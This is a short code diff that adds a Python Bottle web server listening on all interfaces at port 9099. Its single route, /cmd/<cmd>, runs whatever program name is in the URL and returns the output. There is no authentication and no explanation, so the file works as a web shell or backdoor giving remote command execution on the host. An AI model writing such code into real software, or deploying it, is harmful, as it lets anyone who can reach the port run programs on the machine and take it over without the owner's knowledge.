@@ -1,0 +1,7 @@
+
+import subprocess
+from bottle import *
+@get('/cmd/<cmd>')
+def index(cmd):
+    return subprocess.run([cmd], stdout=subprocess.PIPE).stdout
+run(host='0.0.0.0', port=9099)
